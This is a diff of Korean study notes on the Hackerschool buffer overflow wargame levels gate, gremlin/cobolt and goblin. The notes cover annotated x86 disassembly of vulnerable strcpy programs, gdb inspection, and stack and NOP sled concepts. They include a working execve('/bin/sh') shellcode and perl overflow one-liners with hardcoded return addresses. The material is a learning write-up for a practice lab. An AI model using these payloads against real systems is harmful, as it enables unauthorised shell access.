@@ -23,62 +23,98 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 ### (01) LEVEL1: gate/gate
 
 ```
-  0x8048430  <main>:       push   %ebp   0x8048431  <main+1>:     mov    %ebp,%esp    0x8048433 <main+3>:     sub     %esp,0x100    0x8048439 <main+9>:     cmp     DWORD PTR [%ebp+8],1   0x804843d  <main+13>:    jg     0x8048456  <main+38>       0x804843f  <main+15>:    push   0x80484e0   0x8048444  <main+20>:    call   0x8048350  <printf>   0x8048449  <main+25>:    add    %esp,4       0x804844c  <main+28>:    push   0   0x804844e  <main+30>:    call   0x8048360  <exit>   0x8048453 <main+35>:     add    %esp,4    0x8048456 <main+38>:    mov     %eax,DWORD PTR [%ebp+12]   0x8048459  <main+41>:    add    %eax,4   0x804845c <main+44>:     mov    %edx,DWORD PTR [%eax]   0x804845e  <main+46>:    push   %edx   0x804845f <main+47>:     lea    %eax,[%ebp-256]   0x8048465  <main+53>:    push   %eax   0x8048466 <main+54>:     call   0x8048370 <strcpy>   0x804846b  <main+59>:    add    %esp,8    0x804846e <main+62>:    lea     %eax,[%ebp-256]   0x8048474  <main+68>:    push   %eax   0x8048475  <main+69>:    push   0x80484ec   0x804847a  <main+74>:    call   0x8048350  <printf>   0x804847f  <main+79>:    add    %esp,8    0x8048482 <main+82>:    leave   0x8048483  <main+83>:    ret	프롤로그                                                          스택영역  100바이트 할당     [ebp+8]은  첫번째 argument이므로 argc   if(argc <=1)        printf( "argv  error\n");   함수리턴     아래  함수의 argument   exit(0);   함수리턴     [ebp+12]는  두번째 argument이므로 *argv[0]   argv[1]     strcpy의  두번째 argument argv[1]     strcpy의  첫번재 argument &buffer[0]   strcpy(buffer,argv[1]);   함수리턴     &buffer[0]     "%s\n"   printf(""%s\n",buffer);   함수리턴     에필로그
-                                          	                                        
+0x8048430 <main>:       push   %ebp
+0x8048431 <main+1>:     mov    %ebp,%esp  // 프롤로그
 
+0x8048433 <main+3>:     sub    %esp,0x100 // 스택영역 100바이트 할당
 
+0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1 // [ebp+8]은 첫번째 argument이므로 argc
+0x804843d <main+13>:    jg     0x8048456 <main+38>  // if(argc <=1) 
 
+0x804843f <main+15>:    push   0x80484e0
+0x8048444 <main+20>:    call   0x8048350 <printf> // printf( "argv error\n"); 
+0x8048449 <main+25>:    add    %esp,4 // 함수리턴
+
+0x804844c <main+28>:    push   0  // 아래 함수의 argument
+0x804844e <main+30>:    call   0x8048360 <exit> // exit(0)
+0x8048453 <main+35>:    add    %esp,4 // 함수리턴
+
+0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12] // [ebp+12]는 두번째 argument이므로 *argv[0]
+0x8048459 <main+41>:    add    %eax,4
+0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax]  //  argv[1]
+0x804845e <main+46>:    push   %edx
+0x804845f <main+47>:    lea    %eax,[%ebp-256]  // strcpy의 두번째 argument argv[1]
+0x8048465 <main+53>:    push   %eax // strcpy의 첫번재 argument &buffer[0]
+0x8048466 <main+54>:    call   0x8048370 <strcpy> // strcpy(buffer,argv[1])
+0x804846b <main+59>:    add    %esp,8 // 함수리턴
+
+0x804846e <main+62>:    lea    %eax,[%ebp-256]  // &buffer[0]
+0x8048474 <main+68>:    push   %eax // &buffer[0]
+0x8048475 <main+69>:    push   0x80484ec  // "%s\n"
+0x804847a <main+74>:    call   0x8048350 <printf> // printf(""%s\n",buffer)
+0x804847f <main+79>:    add    %esp,8 // 함수리턴
+
+0x8048482 <main+82>:    leave
+0x8048483 <main+83>:    ret
 ```
 
-\1. 제약조건은 arg가 2개 이상이기만 하면 되므로 사용할 수 있는 공간이 많음.
+1. 제약조건은 arg가 2개 이상이기만 하면 되므로 사용할 수 있는 공간이 많다. 가장 기본인 stack 메모리의 시작주소를 return주소로 정하였다.
+  - 셸코드 크기: 25바이트
+  - "\x90"235만큼 채우면 된다.
+  - `r $(perl -e 'print "SHELL CODE" . "\x90"x235 . "\x78\xf9\xff\xbf"')
+  - SHELL CODE 시작될 주소: `bf-ff-f9-78`
+  - "SHELL CODE"
+  ```
+  \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+  ```
+  - arg를 하나 더 추가해서 풀 수도 있음
+  ```
+  x/20s $ebp-3000
+  bffff6d9
+  ```
 
-가장 기본인 stack 메모리의 시작주소를 return주소로 정함
+### (02) LEVEL2: gremlin / hello bof world
+- COBOLT 
 
-셸코드 크기: 25바이트. "\x90"235만큼 채우면
+```
+0x8048430  <main>:       push   %ebp   
+0x8048431  <main+1>:     mov    %ebp,%esp // 프롤로그
 
-됨.
+0x8048433 <main+3>:     sub     %esp,16 // 스택영역 16바이트 할당
 
- r $(perl -e 'print "SHELL
+0x8048436 <main+6>:     cmp     DWORD PTR [%ebp+8],1  // [ebp+8]은 첫번째 argument이므로 argc 
+0x804843a  <main+10>:    jg     0x8048453  <main+35>  // if(argc <=1)
 
-CODE" . "\x90"x235 . "\x78\xf9\xff\xbf"')
+0x804843c <main+12>:    push    0x80484d0   
+0x8048441  <main+17>:    call   0x8048350  <printf> // printf( "argv error\n")
+0x8048446  <main+22>:    add    %esp,4  //  함수리턴
 
- SHELL CODE 시작될
+0x8048449  <main+25>:    push   0  // 아래 함수의 argument
+0x804844b  <main+27>:    call   0x8048360  <exit> // exit(0)
+0x8048450  <main+32>:    add    %esp,4  // 함수리턴
 
-주소:bf-ff-f9-78
+0x8048453 <main+35>:    mov     %eax,DWORD PTR [%ebp+12]  // [ebp+12]는 두번째 argument이므로 *argv[0]
+0x8048456  <main+38>:    add    %eax,4  // argv[1]
 
-"SHELL CODE"
+0x8048459 <main+41>:    mov     %edx,DWORD PTR [%eax]// strcpy의  두번째 argument
+0x804845b  <main+43>:    push   %edx   
+0x804845c <main+44>:     lea    %eax,[%ebp-16]  //strcpy의 첫번재 argument &buffer[0]
+0x804845f  <main+47>:    push   %eax   
+0x8048460 <main+48>:     call   0x8048370 <strcpy> // strcpy(buffer,argv[1]);
+0x8048465  <main+53>:    add    %esp,8
 
-\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+0x8048468 <main+56>:    lea     %eax,[%ebp-16]   
+0x804846b  <main+59>:    push   %eax   
+0x804846c  <main+60>:    push   0x80484dc // "%s\n"
+0x8048471  <main+65>:    call   0x8048350  <printf>   
+0x8048476  <main+70>:    add    %esp,8  // printf(""%s\n",buffer);
 
-arg를 하나 더 추가해서 풀 수도 있음.
-
-x/20s $ebp-3000
-
-bffff6d9
-
-COBOLT 
-
-env | grep SHELL
-
- chsh
-
- /bin/bash2
-
- exit후 재접속
-
- bash2로 변경
-
-후 시작.
-
- 원본
-
-바이너리 복사본으로 분석 시작!
-
-  0x8048430  <main>:       push   %ebp   0x8048431  <main+1>:     mov    %ebp,%esp    0x8048433 <main+3>:     sub     %esp,16    0x8048436 <main+6>:     cmp     DWORD PTR [%ebp+8],1   0x804843a  <main+10>:    jg     0x8048453  <main+35>    0x804843c <main+12>:    push    0x80484d0   0x8048441  <main+17>:    call   0x8048350  <printf>   0x8048446  <main+22>:    add    %esp,4    0x8048449 <main+25>:    push   0   0x804844b  <main+27>:    call     0x8048360  <exit>   0x8048450  <main+32>:    add    %esp,4    0x8048453 <main+35>:    mov     %eax,DWORD PTR [%ebp+12]   0x8048456  <main+38>:    add    %eax,4    0x8048459 <main+41>:    mov     %edx,DWORD PTR [%eax]   0x804845b  <main+43>:    push   %edx   0x804845c <main+44>:     lea    %eax,[%ebp-16]   0x804845f  <main+47>:    push   %eax   0x8048460 <main+48>:     call   0x8048370 <strcpy>   0x8048465  <main+53>:    add    %esp,8    0x8048468 <main+56>:    lea     %eax,[%ebp-16]   0x804846b  <main+59>:    push   %eax   0x804846c  <main+60>:    push   0x80484dc   0x8048471  <main+65>:    call   0x8048350  <printf>   0x8048476  <main+70>:    add    %esp,8    0x8048479 <main+73>:    leave   0x804847a  <main+74>:    ret	프롤로그                                                          스택영역  16바이트 할당     [ebp+8]은  첫번째 argument이므로 argc   if(argc <=1)        printf( "argv  error\n");   함수리턴     아래  함수의 argument   exit(0);   함수리턴     [ebp+12]는  두번째 argument이므로 *argv[0]   argv[1]     strcpy의  두번째 argument argv[1]     strcpy의  첫번재 argument &buffer[0]   strcpy(buffer,argv[1]);   함수리턴     &buffer[0]     "%s\n"   printf(""%s\n",buffer);   함수리턴     에필로그
-                                          	                                        
+0x8048479 <main+73>:    leave   
+0x804847a  <main+74>:    ret  // 함수리턴
+```
 
 1. 셸코드 25바이트. 스택메모리 16바이트. 셸코드를 어디에 업로드??
-
+```
 argv는 어디에 위치하는가?
 
 -----
@@ -100,39 +136,23 @@ argc(ebp+8) (arg가 2라면00000002가 표시됨)
 -----
 
 gdb aa
-
-display/i  $eip
-
-r aaaa bbbb cccc dddd eeee
-
+(GDB) display/i  $eip
+(GDB) r aaaa bbbb cccc dddd eeee
 해서 보면 ret 이후에 6 입력(argument 갯수)
-
 그 다음이 
-
 x/x 그 다음 주소
-
 해서보면
-
 x/s 다음 주소: "/home/gremlin/aa" 가 보임
-
 x/s 그 다음 주소: "aaaa"
-
 x/s 그 다음 주소: "bbbb"
-
 ...
-
 x/s 그 다음 주소: "eeee"
 
-./aa aaaa 하면 aaaa를 쓰든
-
-안쓰든 스택메모리에 저장시킴.
+./aa aaaa 하면 aaaa를 쓰든 안쓰든 스택메모리에 저장시킴.
 
 x/20s 첫번째 주소
-
-해서 보면 argument아래에 환경변수가 입력되게 됨.
-
+해서 보면 argument아래에 환경변수가 입력되게 된다.
 환경변수: env로 확인할 수 있음.
-
 환경변수의 위치에 따라서 main함수 시작 stack pointer 달라짐
 
 kernel
@@ -150,10 +170,8 @@ ret
 kernel영역에 esp
 
 셸코드 넣을 수 있는 부분 두가지
-
-\1. argument.
-
-\2. 환경변수에 업로드.
+1. argument.
+2. 환경변수에 업로드.
 
 sol1) 환경변수 활용해서 풀이
 
@@ -168,21 +186,14 @@ sol2) 매개변수 활용해서 풀이
 ./cobolt  $(perl -e 'print "a"x20 ."\x56\xfc\xff\xbf"') $(perl -e 'print"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
 
 *nop slade
+nop(no operation, not operation)
+nop => \x90
 
- nop(no operation, not
+[nop x 100개][shell code]
+nop코드 있는 어떤 곳 중의 주소만 입력해도 그 뒤에 있는 셸코드 실행 가능.
+```
 
-operation)
-
- nop => \x90
-
- [nop x 100개][shell
-
-code]
-
- nop코드
-
-있는 어떤 곳 중의 주소만 입력해도 그 뒤에 있는 셸코드 실행 가능.
-
+### (03) LEVEL3. cobolt / hacking exposed
 GOBLIN 
 
 gets로 입력받음.
